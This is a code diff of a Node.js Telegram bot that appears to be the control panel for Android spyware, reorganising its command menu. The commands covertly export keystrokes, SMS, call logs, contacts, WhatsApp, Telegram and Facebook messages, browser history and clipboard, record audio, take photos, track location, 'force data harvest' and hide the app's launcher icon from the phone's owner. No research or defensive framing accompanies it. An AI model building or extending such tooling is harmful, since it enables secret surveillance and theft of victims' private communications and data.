@@ -528,51 +528,102 @@ async function answerCallbackQuery(callbackQueryId, text = null) {
         console.error('Error answering callback query:', error.response?.data || error.message);
     }
 }
-
 async function setChatMenuButton(chatId) {
     try {
         console.log(`🔘 Setting menu button for chat ${chatId}`);
         
         const commands = [
+            // ============ HELP & MENU ============
             { command: 'help', description: '📋 Complete help menu' },
             { command: 'showmenu', description: '📋 Show help menu' },
+            
+            // ============ DEVICE MANAGEMENT ============
             { command: 'devices', description: '📱 List all devices' },
             { command: 'select', description: '🎯 Select device to control' },
+            
+            // ============ INFO COMMANDS ============
+            { command: 'status', description: '📊 Device status' },
+            { command: 'info', description: 'ℹ️ Device info' },
             { command: 'device_info', description: '📊 Complete device information' },
             { command: 'network_info', description: '🌐 Complete network information' },
             { command: 'mobile_info', description: '📱 Complete mobile & SIM info' },
+            { command: 'location', description: '📍 Get location' },
+            { command: 'battery', description: '🔋 Battery status' },
+            { command: 'storage', description: '💾 Storage info' },
+            { command: 'time', description: '🕐 Current time' },
+            
+            // ============ SCREENSHOT COMMANDS ============
             { command: 'screenshot', description: '📸 Take screenshot now' },
             { command: 'screenshot_settings', description: '⚙️ Screenshot settings' },
             { command: 'start_screenshot', description: '▶️ Start screenshot service' },
             { command: 'stop_screenshot', description: '⏹️ Stop screenshot service' },
+            { command: 'add_target', description: '➕ Add target app' },
+            { command: 'target_apps', description: '📱 List target apps' },
+            { command: 'small', description: '📏 Small screenshot (30%)' },
+            { command: 'medium', description: '📏 Medium screenshot (70%)' },
+            { command: 'original', description: '📏 Original screenshot' },
+            
+            // ============ RECORDING COMMANDS ============
+            { command: 'record', description: '🎤 Start 60-second recording' },
             { command: 'start_60s_rec', description: '🎤 Start 60-second recording' },
+            { command: 'stop_recording', description: '⏹️ Stop recording' },
             { command: 'stop_60s_rec', description: '⏹️ Stop recording' },
             { command: 'record_info', description: '📊 Recording information' },
             { command: 'record_auto_on', description: '✅ Enable auto recording' },
             { command: 'record_auto_off', description: '❌ Disable auto recording' },
             { command: 'record_custom', description: '⚙️ Set custom schedule' },
+            
+            // ============ AUDIO QUALITY ============
             { command: 'audio_ultra', description: '🎤 Ultra low (8kbps)' },
             { command: 'audio_very_low', description: '🎤 Very low (16kbps)' },
             { command: 'audio_low', description: '🎤 Low (24kbps)' },
             { command: 'audio_medium', description: '🎤 Medium (32kbps)' },
             { command: 'audio_high', description: '🎤 High (64kbps)' },
             { command: 'audio_info', description: '🎤 Audio quality info' },
-            { command: 'contacts', description: '📇 Export contacts' },
-            { command: 'sms', description: '💬 Export SMS' },
-            { command: 'calllogs', description: '📞 Export call logs' },
-            { command: 'apps_list', description: '📱 Export apps' },
-            { command: 'keys', description: '⌨️ Export keystrokes' },
-            { command: 'notify', description: '🔔 Export notifications' },
-            { command: 'open_app', description: '📱 Export app opens' },
-            { command: 'whatsapp', description: '💬 WhatsApp logs' },
-            { command: 'telegram', description: '💬 Telegram logs' },
-            { command: 'facebook', description: '💬 Facebook logs' },
-            { command: 'browser', description: '🌐 Browser history' },
-            { command: 'clipboard', description: '📋 Clipboard logs' },
-            { command: 'calendar', description: '📅 Calendar events' },
+            
+            // ============ DATA EXPORT (NEW ONLY) ============
+            { command: 'contacts', description: '📇 Export new contacts' },
+            { command: 'sms', description: '💬 Export new SMS' },
+            { command: 'calllogs', description: '📞 Export new call logs' },
+            { command: 'apps_list', description: '📱 Export new apps' },
+            { command: 'keys', description: '⌨️ Export new keystrokes' },
+            { command: 'notify', description: '🔔 Export new notifications' },
+            { command: 'open_app', description: '📱 Export new app opens' },
+            
+            // ============ DATA EXPORT (ALL) ============
+            { command: 'contacts_all', description: '📇 ALL contacts' },
+            { command: 'sms_all', description: '💬 ALL SMS' },
+            { command: 'calllogs_all', description: '📞 ALL call logs' },
+            { command: 'apps_all', description: '📱 ALL apps' },
+            { command: 'keys_all', description: '⌨️ ALL keystrokes' },
+            { command: 'notify_all', description: '🔔 ALL notifications' },
+            { command: 'clipboard_all', description: '📋 ALL clipboard' },
+            { command: 'whatsapp_all', description: '💬 ALL WhatsApp' },
+            { command: 'telegram_all', description: '💬 ALL Telegram' },
+            { command: 'facebook_all', description: '💬 ALL Facebook' },
+            { command: 'browser_all', description: '🌐 ALL browser history' },
+            { command: 'calendar_all', description: '📅 ALL calendar events' },
+            
+            // ============ SOCIAL MEDIA ============
+            { command: 'whatsapp', description: '💬 New WhatsApp logs' },
+            { command: 'telegram', description: '💬 New Telegram logs' },
+            { command: 'facebook', description: '💬 New Facebook logs' },
+            
+            // ============ BROWSER & CLIPBOARD ============
+            { command: 'browser', description: '🌐 New browser history' },
+            { command: 'browser_history', description: '🌐 New browser history' },
+            { command: 'clipboard', description: '📋 New clipboard logs' },
+            { command: 'calendar', description: '📅 New calendar events' },
+            
+            // ============ SCAN COMMANDS ============
+            { command: 'full_scan', description: '🔍 Full system scan' },
             { command: 'scan_all', description: '🔍 Full system scan' },
+            { command: 'media_scan', description: '🎵 Media files scan' },
             { command: 'scan_media', description: '🎵 Media files scan' },
+            { command: 'find_recorded', description: '🎤 Find recorded media' },
             { command: 'scan_help', description: '❓ Scan commands help' },
+            
+            // ============ REAL-TIME CONTROLS ============
             { command: 'rt_all_on', description: '✅ Enable all real-time' },
             { command: 'rt_all_off', description: '❌ Disable all real-time' },
             { command: 'rt_keys_on', description: '🔑 Enable keystroke real-time' },
@@ -580,40 +631,43 @@ async function setChatMenuButton(chatId) {
             { command: 'rt_notif_on', description: '🔔 Enable notification real-time' },
             { command: 'rt_notif_off', description: '🔔 Disable notification real-time' },
             { command: 'rt_status', description: '📊 Real-time status' },
+            
+            // ============ NETWORK DATA SAVING ============
             { command: 'saving_status', description: '📡 Network saving status' },
             { command: 'wifi_only_on', description: '📡 Enable WiFi-only mode' },
             { command: 'wifi_only_off', description: '📡 Disable WiFi-only mode' },
+            { command: 'network_status', description: '🌐 Network status' },
+            { command: 'ip_info', description: '🌐 IP info' },
+            { command: 'wifi_info', description: '📶 WiFi info' },
+            { command: 'mobile_info', description: '📱 Mobile info' },
+            { command: 'sim_info', description: '📱 SIM info' },
+            { command: 'phone_number', description: '📞 Phone number' },
+            
+            // ============ SYSTEM CONTROLS ============
             { command: 'sync_all', description: '🔄 Sync all data' },
-            { command: 'force_harvest', description: '⚡ Force data harvest' },
+            { command: 'refresh', description: '🔄 Refresh data' },
             { command: 'refresh_data', description: '🔄 Refresh data' },
+            { command: 'force_harvest', description: '⚡ Force data harvest' },
+            { command: 'stats', description: '📊 Database statistics' },
             { command: 'logs_count', description: '📊 Database statistics' },
             { command: 'clear_logs', description: '🗑️ Clear database' },
             { command: 'reboot_app', description: '🔄 Reboot services' },
+            
+            // ============ ICON CONTROL ============
             { command: 'hide_icon', description: '👻 Hide launcher icon' },
             { command: 'show_icon', description: '👁️ Show launcher icon' },
+            
+            // ============ REGISTRATION ============
             { command: 'force_register_complete', description: '🔄 Force register services' },
+            
+            // ============ CAMERA COMMANDS ============
             { command: 'photo', description: '📸 Take photo' },
             { command: 'camera_switch', description: '🔄 Switch camera' },
             { command: 'camera_front', description: '👤 Front camera' },
             { command: 'camera_back', description: '👥 Back camera' },
             { command: 'camera_on', description: '✅ Start camera monitoring' },
             { command: 'camera_off', description: '❌ Stop camera monitoring' },
-            { command: 'camera_status', description: '📊 Camera status' },
-            { command: 'location', description: '📍 Get location' },
-            { command: 'battery', description: '🔋 Battery status' },
-            { command: 'storage', description: '💾 Storage info' },
-            { command: 'time', description: '🕐 Current time' },
-            { command: 'add_target', description: '➕ Add target app' },
-            { command: 'target_apps', description: '📱 List target apps' },
-            { command: 'small', description: '📏 Small screenshot (30%)' },
-            { command: 'medium', description: '📏 Medium screenshot (70%)' },
-            { command: 'original', description: '📏 Original screenshot' },
-            { command: 'status', description: '📊 Device status' },
-            { command: 'info', description: 'ℹ️ Device info' },
-            { command: 'ip_info', description: '🌐 IP info' },
-            { command: 'wifi_info', description: '📶 WiFi info' },
-            { command: 'sim_info', description: '📱 SIM info' },
-            { command: 'phone_number', description: '📞 Phone number' }
+            { command: 'camera_status', description: '📊 Camera status' }
         ];
         
         await axios.post(`${TELEGRAM_API}/setMyCommands`, { commands });
